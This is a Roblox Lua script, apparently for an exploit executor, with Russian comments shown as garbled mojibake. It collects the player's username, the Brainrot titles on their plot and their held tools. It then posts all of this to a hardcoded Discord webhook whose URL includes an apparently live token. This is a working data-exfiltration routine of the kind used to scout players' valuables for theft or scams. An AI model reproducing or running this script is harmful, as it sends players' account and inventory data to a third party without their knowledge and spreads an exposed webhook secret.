local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer

-- === –ü–æ–∏—Å–∫ —Å–≤–æ–µ–≥–æ –ø–ª–æ—Ç–∞ ===
local function findPlayerPlot()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end

    for _, plot in ipairs(plots:GetChildren()) do
        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
            if label and label.Text == localPlayer.DisplayName then
                return plot
            end
        end
    end
    return nil
end

-- === –°–±–æ—Ä Brainrots ===
local function collectBrainrots(plot)
    local brainrotsText = ""
    local container = plot:FindFirstChild("Brainrots")
    if not container then
        return "‚ùå –ù–µ—Ç Brainrots"
    end

    for i = 1, 17 do
        local node = container:FindFirstChild(tostring(i))
        if node and node:FindFirstChild("Brainrot") then
            local br = node.Brainrot
            local ui = br:FindFirstChild("PlatformUI")
            if ui and ui:FindFirstChild("Title") then
                local text = ui.Title.Text
                if text and text ~= "" then
                    brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
                end
            end
        end
    end

    if brainrotsText == "" then
        brainrotsText = "‚ö†Ô∏è –ü—É—Å—Ç–æ"
    end
    return brainrotsText
end

-- === –°–±–æ—Ä –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è + Character ===
local function collectInventory()
    local invText = ""
    local items = {}

    -- Backpack
    local backpack = localPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end

    -- Character
    local character = localPlayer.Character
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end

    if #items == 0 then
        invText = "‚ö†Ô∏è –ò–Ω–≤–µ–Ω—Ç–∞—Ä—å –ø—É—Å—Ç"
    else
        invText = "\n--- Inventory ---\n"
        for _, name in ipairs(items) do
            invText = invText .. "- " .. name .. "\n"
        end
    end

    return invText
end

-- === –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫ ===
local plot = findPlayerPlot()
local brainrots = plot and collectBrainrots(plot) or "‚ùå Plot –Ω–µ –Ω–∞–π–¥–µ–Ω"
brainrots = brainrots .. collectInventory() -- –æ–±—ä–µ–¥–∏–Ω—è–µ–º Brainrots + Inventory

-- === –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Discord ===
request({
    Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep", -- –≤—Å—Ç–∞–≤—å —Å–≤–æ–π webhook
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "**Brainrots / Elly**",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "üë§ Username",
                    ["value"] = localPlayer.Name,
                    ["inline"] = false
                },
                {
                    ["name"] = "ü™ê Brainrots",
                    ["value"] = brainrots,
                    ["inline"] = false
                }
            }
        }}
    })
})
